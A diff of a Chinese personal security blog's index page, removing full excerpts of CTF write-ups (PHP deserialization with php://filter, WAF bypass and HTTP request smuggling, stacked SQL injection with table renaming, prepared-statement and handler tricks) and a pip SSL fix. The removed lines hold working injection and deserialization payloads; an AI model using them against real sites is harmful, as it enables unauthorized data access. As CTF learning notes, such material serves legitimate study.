-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>到这里我们就可以构造payload了</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> $filename=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize($a)</span><br><span class="line"><span class="comment"># O:11:"FileHandler":3:&#123;s:5:"%00*%00op";i:2;s:11:"%00*%00filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:10:"%00*%00content";N;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这里注意 protected 属性的变量在序列化时 变量名前需要加”%00*%00“</p>
-<p>在这道题中%00的ascii码为0 会被is_valid()函数拦截，这里绕过的话可以利用php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize($a)</span><br><span class="line"><span class="comment">//O:11:"FileHandler":3:&#123;s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>ctf中的php反序列化可参考以下链接</p>
-<ul>
-<li><a href="https://www.cnblogs.com/fish-pompom/p/11126473.html" target="_blank" rel="noopener">https://www.cnblogs.com/fish-pompom/p/11126473.html</a></li>
-<li><a href="https://www.cnblogs.com/Cl0ud/p/12874458.html" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/p/12874458.html</a></li>
-<li><a href="https://www.cnblogs.com/Xy--1/p/12649865.html" target="_blank" rel="noopener">https://www.cnblogs.com/Xy--1/p/12649865.html</a></li>
-</ul>
-
-          
+          <h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组] AreUSerialz"></a>[网鼎杯 2020 青龙组] AreUSerialz</h1><p>借这道题复习记录下反序列化的小细节~</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/01/17/-网鼎杯-2020-青龙组-AreUSerialz.html/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -914,35 +1160,14 @@
 
       
         
-          
-            <h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><h2 id="方法一：PHP特性"><a href="#方法一：PHP特性" class="headerlink" title="方法一：PHP特性"></a>方法一：PHP特性</h2><p>在参数名称前加空格即“ num”，waf识别为“ num”，但是PHP解析时会自动将空格去掉。</p>
-<p>由于过滤了“ / ”，我们构造payload如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num=var_dump(scandir(chr(<span class="number">47</span>)))</span><br><span class="line">calc.php? num=var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">calc.php? num=var_dump(file_get_contents(chr(<span class="number">47</span>).f1agg))</span><br></pre></td></tr></table></figure>
-
-<h2 id="方法二：HTTP走私"><a href="#方法二：HTTP走私" class="headerlink" title="方法二：HTTP走私"></a>方法二：HTTP走私</h2><p>看wp这道题还有HTTP走私这种方法，所以想来重点记录下</p>
-<h3 id="HTTP走私原理"><a href="#HTTP走私原理" class="headerlink" title="HTTP走私原理"></a>HTTP走私原理</h3><p>​    在HTTP1.1之后，HTTP规定了两种标识来表示请求结束，分别是 Content-Length（CL）标头和Transfer-Encoding（TE）标头</p>
-<p>​    CL：以字节为单位指定消息内容体的长度。</p>
-<p>​    TE：指定消息体使用分块编码（ChunkedEncode），即 Transfer-Encoding：chunked ，也就是说消息报文由一个或多个数据块组成，每个数据块大小以字节为单位（十六进制表示） 衡量，后跟CRLF（\r\n），然后是块内容，最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</p>
-<p>​    当我发送请求，包含Content-Length，前端服务器解析后没有问题发送给后端服务器，但是我在请求时后面还包含了Transfer-Encoding，这样后端服务器进行解析便可执行我写在下面的一些命令，这样便可以绕过前端的waf。</p>
-<h3 id="HTTP走私的四种方法"><a href="#HTTP走私的四种方法" class="headerlink" title="HTTP走私的四种方法"></a>HTTP走私的四种方法</h3><h4 id="CL不为0时"><a href="#CL不为0时" class="headerlink" title="CL不为0时"></a>CL不为0时</h4><p>这种情况一般发生在get请求下，当前端允许content-length，后端不允许时，此时后端服务器就不会解析content-length，这样就可能绕过waf。</p>
-<h4 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h4><p>这种利用的前提条件是服务器不会返回400错误。但是前端服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理,这样便有可能引发请求走私。比如出现下面这种情况时：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Length</span>: 68</span><br><span class="line"><span class="attribute">Content-Length</span>: 5</span><br><span class="line"> </span><br><span class="line">num=1GET /calc.php?num=1 HTTP/1.1</span><br><span class="line"><span class="attribute">123456</span></span><br></pre></td></tr></table></figure>
-
-<p>前端先解析第一个cl为68，就会把下面的“num=1GET/calc.php?num=1 HTTP/1.1”都当做请求的内容。但是后端会解析第二个cl，也就是说后端只解析“num=1” 后面的请求体就作为下次请求的请求头（前提是Connection:keep-alive）。这样就会引发走私。</p>
-<h4 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h4><p>就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length这一请求头，而后端服务器会忽略掉Content-Length，处理Transfer-Encoding这一请求头。</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Length</span>: 123</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">12</span></span><br></pre></td></tr></table></figure>
-
-<p>这里的chunked对请求内容进行分块编码，并且直到有\r\n的时候才结束。</p>
-<h4 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h4><p>所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。</p>
-<p>参考文章：<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a></p>
-<hr>
-<p>回到这道题，因为是get请求，而CL字段只有在post请求时才会有用，所以我们利用TE字段来绕过前端的waf</p>
-<p><img src="https://i.loli.net/2021/01/12/KbxzFBj6M7adSGm.png" alt="image-20210112114930755"></p>
-<p>在数据部分必须要加一个换行，来标识请求的结束，Connection也要改为keep-live</p>
-<p>但是经过我的测试发现使用两个CL字段也可以进行绕过前端的waf</p>
-<p><img src="https://i.loli.net/2021/01/12/FxA6fmstJRy4dK1.png" alt="image-20210112115225675"></p>
-
-          
+          <h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/01/17/-RoarCTF-2019-Easy-Calc.html/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1090,72 +1315,14 @@
 
       
         
-          
-            <h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>考点：堆叠注入</p>
-<p>​        堆叠注入就是可以在一条sql语句后加分号，分号之后的就是一个全新的sql语句。但是使用条件十分有限，只有PHP的站在使用mysqli_multi_query()函数时，会同时解析多条语句。往往PHP的站会使用mysqli_ query()函数来限制只能执行一条语句，从而防止sql注入。</p>
-<p>根据返回报错：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match("/<span class="keyword">select</span>|<span class="keyword">update</span>|<span class="keyword">delete</span>|<span class="keyword">drop</span>|<span class="keyword">insert</span>|<span class="keyword">where</span>|\./i<span class="string">",$inject);</span></span><br></pre></td></tr></table></figure>
-
-<p>尝试堆叠注入</p>
-<p>查表</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' ; <span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>查列</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' ; <span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>还可以使用语句</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' ; desc `1919810931114514`<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>注意当数字作为表名的时候，需要用反引号括起来。这里可以看到有flag字段，之后有三种方法可以获得flag。</p>
-<p><img src="https://i.loli.net/2021/01/11/3Knxpz8MwAFNkqI.png" alt="QQ截图20210111111410"></p>
-<h2 id="方法一：更改表名和列名"><a href="#方法一：更改表名和列名" class="headerlink" title="方法一：更改表名和列名"></a>方法一：更改表名和列名</h2><ol>
-<li><p>将表名words换为其他的，类似于word1</p>
-</li>
-<li><p>将表名1919810931114514换为words</p>
-</li>
-<li><p>将列名flag换为id</p>
-<p>构造语句如下</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1' ; </span><br><span class="line"><span class="keyword">rename</span> <span class="keyword">tables</span> <span class="string">`words`</span> <span class="keyword">to</span> <span class="string">`word1`</span> ;      </span><br><span class="line"><span class="keyword">rename</span> <span class="keyword">tables</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> <span class="string">`words`</span> ;  </span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">change</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">varchar</span>(<span class="number">100</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>更改列名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert table `words` <span class="keyword">rename</span> <span class="string">`flag`</span> <span class="keyword">to</span> <span class="string">`id`</span>;</span><br></pre></td></tr></table></figure>
-
-<p>再进行查询</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' or 1=1<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/01/11/6Mi7CVoEzxd3LTD.png" alt="QQ截图20210111112336"></p>
-</li>
-</ol>
-<h2 id="方法二：绕过select限制"><a href="#方法二：绕过select限制" class="headerlink" title="方法二：绕过select限制"></a>方法二：绕过select限制</h2><p>使用<strong>预编译</strong>的方式</p>
-<blockquote>
-<p>set  用于设置变量名和值</p>
-<p>prepare  用于预备一个语句，并赋予名称，以后可以引用该语句</p>
-<p>execute  执行语句</p>
-<p>deallocate prepare  用来释放掉预处理的语句</p>
-</blockquote>
-<p>构造payload如下：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0';</span><br><span class="line"><span class="keyword">set</span> @<span class="keyword">sql</span> = <span class="keyword">CONCAT</span>(<span class="string">'se'</span>,<span class="string">'lect * from `1919810931114514`;'</span>);</span><br><span class="line"><span class="keyword">prepare</span> <span class="keyword">exp</span> <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">exp</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/01/11/TajpPA945koYRzn.png" alt="QQ截图20210111114359"></p>
-<p>strstr函数不会识别大小写，所以我们进行大小写绕过即可</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0';</span><br><span class="line"><span class="keyword">Set</span> @<span class="keyword">sql</span> = <span class="keyword">CONCAT</span>(<span class="string">'se'</span>,<span class="string">'lect * from `1919810931114514`;'</span>);</span><br><span class="line"><span class="keyword">prePare</span> <span class="keyword">exp</span> <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">exp</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>还可以将“select * from <code>1919810931114514</code>”16进制编码：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0';</span><br><span class="line"><span class="keyword">SeT</span> @<span class="keyword">sql</span>=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;</span><br><span class="line"><span class="keyword">prepare</span> <span class="keyword">exp</span> <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> <span class="keyword">exp</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/01/11/HrJGOV6ULQWFRhg.png" alt="QQ截图20210111115502"></p>
-<h2 id="方法三：使用handler绕过"><a href="#方法三：使用handler绕过" class="headerlink" title="方法三：使用handler绕过"></a>方法三：使用handler绕过</h2><p>payload：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0'; <span class="keyword">handler</span> <span class="string">`1919810931114514`</span> <span class="keyword">open</span> <span class="keyword">as</span> <span class="string">`a`</span>; <span class="keyword">handler</span> <span class="string">`a`</span> <span class="keyword">read</span> <span class="keyword">next</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/01/11/yf3neJBNulXFIKj.png" alt="QQ截图20210111124042"></p>
-<p>注：handler用法</p>
-<p>​    handler是MySQL中特有的语法，可代替select对表中的数据进行逐行的查询</p>
-<p>​    基本语法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</span><br><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">#FIRST获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">#通过HANDLER tbl_name CLOSE来关闭打开的句柄。</span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过索引去查看的话可以按照一定的顺序，获取表中的数据。</span><br><span class="line">通过索引列指定一个值，可以指定从哪一行开始。</span><br><span class="line">通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。</span><br><span class="line">如果我们不想浏览一个表的所有行，可以使用where和limit子句。</span><br></pre></td></tr></table></figure>
-
-<p>参考链接 : <a href="https://blog.csdn.net/JesseYoung/article/details/40785137" target="_blank" rel="noopener">https://blog.csdn.net/JesseYoung/article/details/40785137</a></p>
-
-          
+          <h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>考点：堆叠注入</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/01/17/强网杯-2019-随便注.html/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1265,7 +1432,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  435 字
+                  436 字
                 </span>
               
 
@@ -1303,48 +1470,16 @@
 
       
         
-          
-            <h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><blockquote>
+          <h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><blockquote>
 <p>错误：CouldnotfetchURL<a href="https://pypi.python.org/simple/pytest-xdist/" target="_blank" rel="noopener">https://pypi.python.org/simple/pytest-xdist/</a>: There wasaproblem confirmingthessl certificate: [SSL: TLSV1_ALERT_PROTOCOL_VERSION] tlsv1 alert protocolversion(_ssl.c:590)</p>
 </blockquote>
-<p>原因：python.org已经不支持TLSv1.0和TLSv1.1，需要升级pip，但是pip用不了，所以手动升级</p>
-<p>解决方案：</p>
-<p>1.mac或者linux操作系统：在终端下执行命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://bootstrap.pypa.io/get-pip.py | python3</span><br></pre></td></tr></table></figure>
-
-<p>2.windows操作系统：从<a href="https://bootstrap.pypa.io/get-pip.py下载get-pip.py文件，然后使用python运行这个文件python" target="_blank" rel="noopener">https://bootstrap.pypa.io/get-pip.py下载get-pip.py文件，然后使用python运行这个文件python</a> get-pip.py</p>
-<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><blockquote>
-<p>错误：Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None)) after connection broken by ‘SSLError(SSLError(1, u’[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:661)’),)’</p>
-</blockquote>
-<p>原因：可能用国外镜像源连接不好</p>
-<p>解决方案：</p>
-<p>1.mac或者linux操作系统：</p>
-<p>修改 ~/.pip/pip.conf (没有就创建一个)， 更换 index-url</p>
-<blockquote>
-<p>[global]</p>
-<p> index-url = <a href="http://pypi.douban.com/simple" target="_blank" rel="noopener">http://pypi.douban.com/simple</a></p>
-</blockquote>
-<p>2.windows操作系统：</p>
-<p>直接在user目录中创建一个pip目录，如：C:\Users\xx\pip，新建文件pip.ini，内容同上</p>
-<p>附：镜像源</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">阿里云 http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/</span><br><span class="line"></span><br><span class="line">豆瓣 http://pypi.douban.com/simple</span><br><span class="line"></span><br><span class="line">Python官方 https://pypi.python.org/simple/</span><br><span class="line"></span><br><span class="line">v2ex http://pypi.v2ex.com/simple/</span><br><span class="line"></span><br><span class="line">中国科学院 http://pypi.mirrors.opencas.cn/simple/</span><br><span class="line"></span><br><span class="line">清华大学 https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure>
-
-<h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><blockquote>
-<p>错误：Could not fetch URL <a href="https://pypi.org/simple/pip/" target="_blank" rel="noopener">https://pypi.org/simple/pip/</a>: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host=’pypi.org’, port=443): Max retries exceeded with url: /simple/pip/ (Caused by SSLError(SSLError(1, ‘[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:833)’),)) - skipping</p>
-</blockquote>
-<p>原因：在最新的 pip 版本(&gt;=7)中，使用镜像源时，会提示源地址不受信任或不安全</p>
-<p>解决方案1：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --trusted-host pypi.org --trusted-host files.pythonhosted.org 包名</span><br></pre></td></tr></table></figure>
-
-<p>解决方案2：(推荐)</p>
-<p>在第二个解决方案中：添加一项配置</p>
-<blockquote>
-<p>[install]</p>
-<p>trusted-host=<a href="http://pypi.douban.com/simple" target="_blank" rel="noopener">http://pypi.douban.com/simple</a></p>
-</blockquote>
-<p>参考链接：<a href="https://www.jianshu.com/p/6f6c640b0371" target="_blank" rel="noopener">https://www.jianshu.com/p/6f6c640b0371</a></p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/01/17/python3安装第三方包时ssl报错.html/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1688,311 +1823,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2019/08/11/内网学习记录.html/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="狗蛋菌">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Goudan's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/11/内网学习记录.html/" itemprop="url">内网学习记录</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-11T19:36:50+08:00">
-                2019-08-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  0 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2019/07/31/在win10上安装kali子系统.html/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="狗蛋菌">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Goudan's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/31/在win10上安装kali子系统.html/" itemprop="url">在win10上安装kali子系统</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-31T20:32:40+08:00">
-                2019-07-31
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  451 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="打开windows开发人员模式"><a href="#打开windows开发人员模式" class="headerlink" title="打开windows开发人员模式"></a>打开windows开发人员模式</h2>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/07/31/在win10上安装kali子系统.html/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2043,7 +1873,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">11</span>
